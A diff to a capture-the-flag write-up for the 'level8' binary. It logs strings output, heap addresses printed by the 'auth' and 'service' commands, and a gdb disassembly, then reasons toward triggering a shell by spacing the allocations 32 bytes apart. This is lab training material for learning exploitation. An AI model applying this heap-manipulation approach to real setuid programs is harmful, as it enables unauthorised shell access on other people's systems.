@@ -1,3 +1,37 @@
+$> strings level8 | less
+[...]
+%p, %p
+auth
+reset
+service
+login
+/bin/sh
+Password:
+[...]
+
+# We see some interesting strings, let's try to enter them
+$> ./level8
+(nil), (nil)
+> auth
+0x804a008, (nil)
+> service
+0x804a008, 0x804a018
+> login
+Password:
+> auth
+0x804a028, 0x804a018
+> auth
+0x804a038, 0x804a018
+
+# Ok when we write "auth " and "service" the two addresses update by 0x10 from the last written address
+# Let's see if we can find more by using gdb
+gdb> disass main
+[...]
+   0x08048625 <+193>:	cmp    eax,0x1e
+[...]
+
+# We see a `cmp` is made with the value 0x1e == 31
+# Let's see what happens if we make the difference between the addresses `auth` and `service` 0x20 == 32
 $> ./level8
 (nil), (nil)
 > auth
